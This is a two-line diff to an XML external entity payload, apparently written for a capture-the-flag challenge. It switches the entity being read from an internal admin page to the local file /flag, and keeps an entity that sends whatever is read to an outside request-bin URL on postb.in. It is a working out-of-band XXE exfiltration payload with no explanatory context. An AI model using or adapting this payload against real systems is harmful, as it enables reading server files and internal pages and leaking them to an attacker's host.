@@ -1,2 +1,2 @@
-<!ENTITY % data SYSTEM "http://127.0.0.1:3000/admin.php">
+<!ENTITY % data SYSTEM "/flag">
 <!ENTITY % final "<!ENTITY exfil SYSTEM 'https://www.postb.in/1733614900816-0600757522042/?d=%data;'>">
